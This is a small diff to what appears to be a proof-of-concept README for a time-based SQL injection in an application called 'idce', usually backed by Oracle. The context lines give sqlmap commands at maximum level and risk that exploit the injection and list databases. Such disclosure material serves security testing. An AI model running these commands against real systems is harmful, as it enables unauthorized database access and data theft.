@@ -24,7 +24,7 @@ The database usually is an Oracle, but it could be changed.
 5. Execute SQLMap with the following command: sqlmap -r idce-sqli.txt --dbms=oracle --level=5 --risk=3 --technique=T
 6. Wait for the end of SQLi execution.
 
-DBMS usually is an Oracle, but you could have to find out the DBMS whether it was changed. For this, you could execute the following command:
+DBMS of this application usually is an Oracle, but you could have to find out the DBMS whether it was changed. For this, you could execute the following command:
 sqlmap -r idce-sqli.txt --dbs --level=5 --risk=3 --technique=T
 
 If you do not have success with the Time-Based techniques, try all other possible techquines with the following command:
